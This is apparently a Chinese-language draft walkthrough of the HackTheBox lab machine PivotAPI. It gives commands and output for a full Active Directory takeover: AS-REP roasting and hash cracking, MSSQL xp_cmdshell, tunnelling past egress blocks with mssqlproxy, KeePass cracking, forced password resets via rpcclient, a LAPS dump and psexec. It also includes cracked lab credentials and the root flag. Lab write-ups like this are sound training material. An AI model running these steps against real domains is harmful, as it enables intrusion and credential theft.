+++
date = '2025-08-06T14:21:58+08:00'
draft = true
title = 'HTB PivotAPI'
+++

涉及到的内容:
- smb服务枚举
- PDF文件元数据查看
- FTP匿名访问
- Kerberos->AS-REP Roasting 攻击
- john破解 TGT hash
- `nxc(NetExec)`访问Smb服务
- outlook邮件格式转换
- bloodhound进行域内攻击路径解析
- ghidra静态分析
- PE文件逆向
- sysinternals组件的Procmon64程序动态分析PE文件
- 简单的windows用户, 目录权限设置
- BAT文件简单修改
- API Monitor进行进程行为监控，监控进程与windowsAPI的交互与调用的函数及数据
- 基于mssql的提权
- 基于mssql绕过机器本身对于TCP, UDP, ICMP的封锁
- 域内用户，用户组枚举
- keepass密码文件破解（kdbx）
- 使用dnspy逆向dotNET程序
- 内网横移
- 使用rpcclient修改域内用户的密码
- 使用laps.py脚本，dump LAPS密码
- psexec.py脚本得到administrador用户权限，拿下域控

使用到的工具:
- `nmap, dig, smbmap, smbclient, nxc, rpcclient, enum4linux-ng`
- `ftp`
- `exiftool, pdf-parse`
- `kerbrute`
- `john, hashcat`
- `bloodhound`
- `sysinternals, pocman64`
- `API Monitor, dnspy`
- `mssqlclient.py, mssqlproxy`
- `evil-winrm, laps.py, psexec.py

PivotAPI是Hackthebox INSAIN难度的靶机，前期的信息收集与枚举过程中就花了很多时间，最终在PDF文件的metadata中得到初始的用户名，通过AS-REP Roasting攻击得到了初始的域内用户，登录到smb服务之后得到exe程序，ghidra静态分析发现程序本身是有加密的，通过sysinternals组件的pcoman64程序进行动态分析，查看程序所做的行为，修改用户对于temp目录的删除权限，保留下bat文件，修改bat文件的内容，得到第二个exe文件，在通过`API Monitor`程序，分析第二exe程序的syscall（与windows API的交互），查看其运行时产生的数据，从而结合bloodhound的分析，通过**猜测**得到mssql SA用户的凭证，通过mssqlproxy绕过受限制的环境，成功将内网中的winrm服务转发出来，得到一个不稳定的winrm shell，在登录之后简单浏览，得到一个keepass的密码文件，通过john破解得到一个可以ssh登录的用户，之后简单浏览，evil-winrm访问用户jari的文件夹，得到dotNET程序，通过对dotNET程序使用`dnspy`进行逆向，查看其中数据得到一个密码。结合bloodhound的分析，使用rpcclient来逐个修改密码，而不是使用特别折磨的winrm。从而一路横移到可以读取LAPS的用户，通过laps.py开源脚本读取administrador用户的LAPS密码，从而避免了使用winrm。根据bloodhound的分析，administrador用户本身不能ssh登陆也不能winrm登录，这里使用psexec.py来得到administrador用户的shell，最终拿到root flag。

整个流程中关键点在于对于windows程序以及.NET程序的简单逆向，使用针对kerberos不安全配置的AS-REP Roasting 攻击，通过mssqlproxy绕过对于TCP, UDP, ICMP出站的封锁，使用rcpclient从而不适用受限制的winrm来修改域内用户密码并最终得到administrador用户的LAPS，中间过程中参杂许多的小技巧与细节，整体难度特别大。


### Recon

```bash
ports=$(cat nmapscan/ports.nmap | grep open | awk -F '/' '{print $1}' | paste -sd ',')

sudo nmap -sT -p21,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389,49667,49673,49674,49706 -sC -sV -O 10.10.10.240 -oA nmapscan/details

```

### FTP

```bash
ftp 10.10.10.240
anonymous
binary
prompt
mget *.pdf
```

### SMB枚举

手工使用如`smbmap`, `smbclient`, `rpcclient`等进行枚举，发现在没有得到凭证的情况下对于SMB服务没有访问权限，通过`enum4linux-ng`自动枚举的结果中也可以看到

```bash
enum4linux-ng -A LicorDeBellota.htb
```
### PDF

通过PDF得到了几个用户名

```bash
exiftool *.pdf  | grep -i -E creator\|author | grep -v -i microsoft | awk -F ':' '{print $2}' | uniq | grep -vE '[0-9]' | tail -n 5 | tail -n 4 | tee username

saif
byron gronseth
gronseth
byron
Kaorz
alex
```

### AS-REP Roasting 攻击

如果域控中某些用户没有开启预认证，那么就可能可以通过AS-REP Roasting的方式得到这些用户的TGT，离线解密从而得到凭证。

```bash
./kerbrute userenum --dc 10.10.10.240 -d LicorDeBellota.htb username.txt
[+] VALID USERNAME:       Kaorz@LicorDeBellota.htb
```

john破解一下`TGT hash`

```bash
─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py LicorDeBellota.htb/Kaorz -dc-ip 10.10.10.240
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate Kaorz, getting its TGT
$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:1bc7f71d47c8a4389f7716eadeb6f786$dfe45a53c00a2d9ed2173cef52ad9a7c0fa5833fd2ffe67383ee5156ee9d0144de9a639d0453327662535d4c0d1707f5d681c0cbb84f759732d7298d77e67dcd79cb28ced178c0570ec65e9d3507b1e6a11eeedc2ba604730746fc452ea935e642da0c145fea90df69babf68af6068cfd31b4e7de90560ce30db6adbda8cf11c3f6c0b1b368b0ced102ffe8b794888c6179f1c7c36ea7bbc7336fa77a952fb4c4c63dcfab21d4d6128f4143d514b870370d87c2c690c6700b58d940af2b5b917c083bcbdbc1ea43d114bc97dbb60d6abbcef22da6e2f460f95d23c734bd9955f85cfc72267655f419012c66bd5e064b5d7abad13054f0674
```

```bash
john TGT_hash --wordlist=/usr/share/wordlists/rockyou.txt
john TGT_hash --show
$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:Roper4155
```

也可以使用`hashcat`

```bash
.\hashcat.exe --help | findstr AS-REP
18200 | Kerberos 5, etype 23, AS-REP

.\hashcat.exe -m 18200 .\hashes\TGT_hash.txt .\hashes\rockyou.txt

Roper4155
```

```bash
Kaorz:Roper4155
```


尝试使用得到的凭证登陆mssql，ssh。 都没能成功

```bash
cd /usr/share/doc/python3-impacket/examples
export PATH=$PATH:.

mssqlclient.py LicorDeBellota.htb/Kaorz:Roper4155@LicorDeBellota.htb
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'Kaorz'.

└─$ sshpass -p 'Roper4155' ssh  Kaorz@LicorDeBellota.htb
Permission denied, please try again.
```

### 登录到SMB服务

```bash
nxc smb LicorDeBellota.htb -u 'Kaorz' -p 'Roper4155' --shares
SMB         10.10.10.240    445    PIVOTAPI         IPC$            READ            IPC remota
SMB         10.10.10.240    445    PIVOTAPI         NETLOGON        READ            Recurso compartido del servidor de inicio de sesión 
SMB         10.10.10.240    445    PIVOTAPI         SYSVOL          READ            Recurso compartido del servidor de inicio de sesión

smbclient  -U LicorDeBellota.htb/Kaorz%Roper4155 //10.10.10.240/IPC$
# /IPC$ 没有文件
smbclient  -U LicorDeBellota.htb/Kaorz%Roper4155 //10.10.10.240/NETLOGON
cd helpdesk
prompt off
mget *

```

#### 读取msg outlook邮件文件(msgconvert)

msgconvert可以将outlook邮件格式转换成Linux可以读取的eml格式

```bash
msgconvert *.msg

Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020.                                          
Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-Service.exe" was created to log in to Oracle and restart the ser
vice.


After the last pentest, we have decided to stop externally displaying WinRM's service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... 
We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.)                      
Greetings,                                                                                   
                                                                                             
The HelpDesk Team
```

### 使用Bloodhound分析攻击路径

[bloodhound query library](https://queries.specterops.io/) 

```bash
admin, admin

admin
Pass@word!123456

# 使用采集器采集域内信息
bloodhound-python -c ALL -d LicorDeBellota.htb -dc LicorDeBellota.htb -u Kaorz -p 'Roper4155' -ns 10.10.10.240 --zip

INFO: Found 28 users
INFO: Found 58 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
```

设置Kaorz用户为owned，bloodhound没有找到任何可能的横移路径
### PE程序逆向

通过ghidra静态分析发现基本上都是有混淆的，啥也看不出来，换个动态分析的工具

![](https://images.geist-tech.top/PicList/20250805092350727.png)


#### 使用Procmon64动态分析

[sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/)

微软的`sysinternals`套件是一套用于进程监控，调试等功能的工具集合，这里用Procmon工具监控`Restart-OracleService.exe`运行时的行为

在过滤器中设置`Process Name-> contain-> OracleService`和>`Operation->cotains->Reg->Exclude`

![](https://images.geist-tech.top/PicList/20250805110018484.png)

可以看到创建了BAT文件并写入，但是实际去路径中看的时候发现什么都没有，通过修改Temp文件夹的权限，来禁止掉一切可能存在的删除操作，然后再执行exe文件

	右键->`properties`->->`Security`->admin用户->`advanced`->`disable inheritance`->`Convert to xxxx` 此时就可以编辑admin用户的权限了


![](https://images.geist-tech.top/PicList/20250805110858832.png)


重新执行一下exe文件，看到在Temp目录下bat文件被保存下来了，打开bat文件查看里面的内容，发现最开始判断了username，然后输出一堆的base64编码过的内容到`c:\programdata\oracle.txt`文件中，最后写了一个ps1脚本，逐行遍历`oracle.txt`文件，将内容base64解码并且调用IO操作，将解码后的raw写入`restart-service.exe`，powershell执行脚本之后再执行exe文件，之后删掉所有记录

```powershell
echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1

powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```

修改一下这个文件的内容，删掉一开始对于用户名的判断和最后的删除操作

```txt
goto correcto
goto error
```

如果一切正常就能在programdata下看到文件。

#### 逆向分析restart-service.exe

在ghidra打开之后提示`MinGW Relocations: MinGW pseudo-relocation list not found`，这是因为windows PE文件不支持ELF文件那样的PIC（位置无关代码）的方式进行重定位，所以wingw使用了伪重定位的方式来处理静态链接库和全局变量的位置问题。

直接在windows上用windows的分析工具分析，这里要在ghidra上修复这个问题再静态分析，太难搞

#### API Monitor

[API Monitor](http://www.rohitab.com/downloads)

API Monitor可以监控程序运行时和windows API的交互，以及函数，数据等，就像Linux中strace可以跟踪ELF程序运行时候的syscall一样

监控一下进程，因为在邮件中提示`restart-service.exe`是一个用来解决`Oracle`数据库的运行问题的程序，用来重启`Oracle`，所以尝试用关键词`passw`直接搜索一下是否存在连接数据库的账号密码。

![](https://images.geist-tech.top/PicList/20250805123505486.png)


```bash
svc_oracle: #oracle_s3rV1c3!2010
```

### 域渗透

在bloodhound查看一下，发现只有svc_mssql用户

```bash
$ sshpass -p '#oracle_s3rV1c3!2010' ssh svc_oracle@LicorDeBellota.htb
Permission denied, please try again.
```

根据之前邮件的内容以及bloodhound查找到的mssql用户，猜测可能存在一个mssql的凭证

```bash
svc_mssql, #mssql_s3rV1c3!2020
```

```bash
mssqlclient.py 'LicorDeBellota.htb/svc_mssql:#mssql_s3rV1c3!2020@10.10.10.240'

Line 1: Error de inicio de sesión del usuario 'svc_mssql'.
```

提示不正确，这里可能是猜测错了，但是svc_mssql这个账号是bloodhound给出的一个系统账号，服务器本身的mssql是不是用的svc_mssql这个用户名，其实不一定，还可以试试mssql的默认用户名

```bash
mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240'
```

```bash
enable_xp_cmdshell
xp_cmdshell systeminfo
```

|原文（西班牙语）|翻译（英语）|
|---|---|
|**Nombre de host:** PIVOTAPI|**Host Name:** PIVOTAPI|
|**Nombre del sistema operativo:** Microsoft Windows Server 2019 Standard|**OS Name:** Microsoft Windows Server 2019 Standard|
|**Versión del sistema operativo:** 10.0.17763 N/D Compilación 17763|**OS Version:** 10.0.17763 N/A Build 17763|
|**Configuración del sistema operativo:** Controlador de dominio principal|**OS Configuration:** Primary Domain Controller|
|**Propiedad de:** Usuario de Windows|**Registered Owner:** Windows User|
|**Fecha de instalación original:** 07/08/2020, 23:14:31|**Original Install Date:** 07/08/2020, 23:14:31|
|**Tiempo de arranque del sistema:** 05/08/2025, 2:27:32|**System Boot Time:** 05/08/2025, 2:27:32|
|**Fabricante del sistema:** VMware, Inc.|**System Manufacturer:** VMware, Inc.|
|**Modelo el sistema:** VMware7,1|**System Model:** VMware7,1|
|**Tipo de sistema:** x64-based PC|**System Type:** x64-based PC|
|**Procesador(es):** 2 Procesadores instalados.|**Processor(s):** 2 processors installed.|
|**Versión del BIOS:** VMware, Inc...|**BIOS Version:** VMware, Inc...|
|**Directorio de Windows:** C:\Windows|**Windows Directory:** C:\Windows|
|**Directorio de sistema:** C:\Windows\system32|**System Directory:** C:\Windows\system32|
|**Dispositivo de arranque:** \Device\HarddiskVolume2|**Boot Device:** \Device\HarddiskVolume2|
|**Configuración regional del sistema:** es;Español (internacional)|**System Locale:** es;Spanish (International)|
|**Idioma de entrada:** en-us;Inglés (Estados Unidos)|**Input Language:** en-us;English (United States)|
|**Zona horaria:** UTC+01:00 Amsterdam, Berlin...|**Time Zone:** UTC+01:00 Amsterdam, Berlin...|
|**Cantidad total de memoria física:** 4.095 MB|**Total Physical Memory:** 4,095 MB|
|**Dominio:** LicorDeBellota.htb|**Domain:** LicorDeBellota.htb|
|**Revisión(es):** 8 revisión(es) instaladas.|**Hotfix(es):** 8 Hotfixes Installed|
|**Tarjeta(s) de red:** 1 Tarjetas de interfaz de red instaladas.|**Network Adapter(s):** 1 network interface card installed|
|**Direcciones IP:** 10.10.10.240|**IP Address:** 10.10.10.240|
|**Requisitos Hyper-V:** Se detectó un hipervisor. No se mostrarán las características necesarias para Hyper-V.|**Hyper-V Requirements:** A hypervisor has been detected. Features required for Hyper-V will not be displayed.|


```bash
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

| 名称（Privilege Name）            | 描述（Description）                                                                          | 状态（Status）                   |
| ----------------------------- | ---------------------------------------------------------------------------------------- | ---------------------------- |
| SeAssignPrimaryTokenPrivilege | Reemplazar un símbolo (token) de nivel de proceso _(Replace a process-level token)_      | ❌ Deshabilitado _(Disabled)_ |
| SeIncreaseQuotaPrivilege      | Ajustar las cuotas de la memoria para un proceso _(Adjust memory quotas for a process)_  | ❌ Deshabilitado _(Disabled)_ |
| SeMachineAccountPrivilege     | Agregar estaciones de trabajo al dominio _(Add workstations to domain)_                  | ❌ Deshabilitado _(Disabled)_ |
| SeChangeNotifyPrivilege       | Omitir comprobación de recorrido _(Bypass traverse checking)_                            | ✅ Habilitada _(Enabled)_     |
| SeManageVolumePrivilege       | Realizar tareas de mantenimiento del volumen _(Manage volume maintenance tasks)_         | ✅ Habilitada _(Enabled)_     |
| SeImpersonatePrivilege        | Suplantar a un cliente tras la autenticación _(Impersonate client after authentication)_ | ✅ Habilitada _(Enabled)_     |
| SeCreateGlobalPrivilege       | Crear objetos globales _(Create global objects)_                                         | ✅ Habilitada _(Enabled)_     |
| SeIncreaseWorkingSetPrivilege | Aumentar el espacio de trabajo de un proceso _(Increase process working set)_            | ❌ Deshabilitado _(Disabled)_ |

### 提权
#### mssqlproxy

通过mssql得到的shell做一些简单的枚举

```bash
Miembros del grupo local                                                        

Miembros del grupo global                  *Usuarios del dominio                

                                           *WinRM 
```

```bash

SQL (sa  dbo@master)> xp_cmdshell netstat -ano | findstr 5985
output                                                                        
---------------------------------------------------------------------------   
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4      

  TCP    [::]:5985              [::]:0                 LISTENING       4      

  UDP    0.0.0.0:55985          *:*                                    2532   

NULL
```

能看到winrm服务是正常开放的，但是这是在内网中运行的服务，外部不能直接访问，之前的nmap端口扫描结果也能验证这一点，并且邮件中提示所有TCP, UDP, 甚至ICMP的output都被封掉了，像chisel这样的HTTP代理工具通过socks协议来实现访问，其本质是基于TCP连接的，还是要和kali建立TCP的连接，但是此处TCP出站是被禁止的。

通过mssqlproxy把内网中的服务转发出来，从而得到evil-winrm的shell，msssqlproxy通过sqlserver来建立通信，从而可以绕过防火墙本身的封锁，使用的TDS协议，这是
SQL Server ⽤于与客户端通信的协议。

```bash
python3 mssqlproxy/mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.10.10.240'

enable_ole
upload reciclador.dll C:\windows\temp\reciclador.dll

python mssqlproxy/mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.10.10.240' -install -clr assembly.dll

python mssqlproxy/mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.10.10.240' -start -reciclador 'c:\programdata\reciclador.dll'

/etc/proxychains4.conf # 添加一行socks5代理
socks5  127.0.0.1 1337
```

测试一下mssqlproxy是否已经建立

```bash
sudo proxychains4 nmap -sT -p 5985 127.0.0.1
PORT     STATE SERVICE
5985/tcp open  wsman
```

#### 破解kdbx密码

```bash
keepass2john credentials.kdbx > kdbx_hash
john kdbx_hash --wordlist=/usr/share/wordlists/rockyou.txt
mahalkita
```

```bash

show -f 'Sample Entry'
show -f Sample\ Entry\ #2

kpcli:/Database> show -f 'Windows/SSH'

 Path: /Database/Windows/
Title: SSH
Uname: 3v4Si0N
 Pass: Gu4nCh3C4NaRi0N!23
  URL: 
Notes:
```

```bash
ssh 3v4Si0N@LicorDeBellota.htb
```

#### 通过bloodhound一路横移

`DR.ZAIUSS->SUPERFUME->DEVELOPERS group`，修改密码之后通过evil-winrm登录到用户，进行下一步横移，SUPERFUME用户属于developer组，在jail用户的目录下找到到 .NET 程序`restart-service.exe`

```bash
# Pass@word!123

python mssqlproxy/mssqlclient.py 'sa:#mssql_s3rV1c3!2020@10.10.10.240' -start -reciclador 'c:\programdata\reciclador.dll'

net user DR.ZAIUSS Pass@word!123
net user SUPERFUME Pass@word!123
```

#### dotNET逆向

通过dnspy逆向.NET程序，在main函数中看到一个writeline()函数，用于以文本格式将数据写入标准输出流，设置断点之后右键数据->内存中显示，得到输出的内容

![](https://images.geist-tech.top/PicList/20250806080157368.png)

```bash
Cos@Chung@!RPG
jari，Cos@Chung@!RPG
```

这里mssqlproxy的转发总是有问题，不能正常把端口转发过来，可能是HTB的环境问题。可以换成用`rcpclient`来登录

```bash
rpcclient -U 'jail%Cos@Chung@!RPG' 10.10.10.240
```

bloodhound给出的路径: `jari->GIBDEON->OPERS. DE CUENTAS组->LAPS ADM组->读取PIVOTAPI.LICORDEBELLOTA.HTB的LAPS`

![](https://images.geist-tech.top/PicList/20250806102312436.png)

[通过rcpclient更改用户的密码](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/)

```bash
setuserinfo2 gibdeon 23 'Pass@word!123'
rpcclient -U 'gibdeon%Pass@word!123' 10.10.10.240
```

为什么这里指定的参数是23: [2.2.6.24 SAMPR_USER_INTERNAL4_INFORMATION](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

```c++
# SAMPR_USER_INTERNAL4_INFORMATION
 typedef struct _SAMPR_USER_INTERNAL4_INFORMATION {
   SAMPR_USER_ALL_INFORMATION I1;
   SAMPR_ENCRYPTED_USER_PASSWORD UserPassword;
 } SAMPR_USER_INTERNAL4_INFORMATION,
  *PSAMPR_USER_INTERNAL4_INFORMATION;
```

```bash
licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>net groups "LAPS READ" /domain
Nombre de grupo     LAPS READ
Comentario

Miembros

-------------------------------------------------------------------------------
cybervaca                lothbrok
Se ha completado el comando correctamente.


licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>net groups "LAPS ADM" /domain
Nombre de grupo     LAPS ADM
Comentario

Miembros

-------------------------------------------------------------------------------
cybervaca
Se ha completado el comando correctamente.
```

如果可以拿到`cybervaca`或者`lothbrok`用户，那么就可以读取LAPS。

bloodhound显示`GIBDEON@LICORDEBELLOTA.HTB`属于`OPERS. DE CUENTAS`组，此组对于`LOTHBROK`用户有全部权限

到这里路径很清晰了，通过rcp修改掉`LOTHBROK`用户的密码，然后调用`LOTHBROK`用户的权限读取LAPS就可以了

#### DUMP LAPS密码

可以直接用开源的python脚本去查看LAPS的值，因为目前通过mssqlproxy代理转发非常不稳定，用powershell读取LAPS属性的方式非常不方便，直接用pyhton脚本来读取更符合当前的场景

[dump LAPS](https://github.com/n00py/LAPSDumper)

```bash
setuserinfo2 lothbrok 23 'hackerone0o!@'

└─$ python laps.py -u lothbrok -p 'hackerone0o!@' -d LicorDeBellota.htb -l 10.10.10.240

LAPS Dumper - Running at 08-06-2025 00:12:17
PIVOTAPI jDIiWNVly8u1P1KZ4Hb2
```

#### psexec.py

此时虽然已经拿到了`administrador`用户的密码，但是ssh和winrm都不对这个用户开放，这种情况下可以使用`impacket`工具集的`psexec.py`脚本

```bash
python3 psexec.py LicorDeBellota.htb/administrador:jDIiWNVly8u1P1KZ4Hb2@10.10.10.240
```

`psexec.py`本身需要在smb服务中上传文件并调用，从而实现`getshell`，所以在没有smb的写权限的情况下，是不能正常利用的

#### root.txt

```bash
92c3424eef08afa489c41ae9b429e730
```












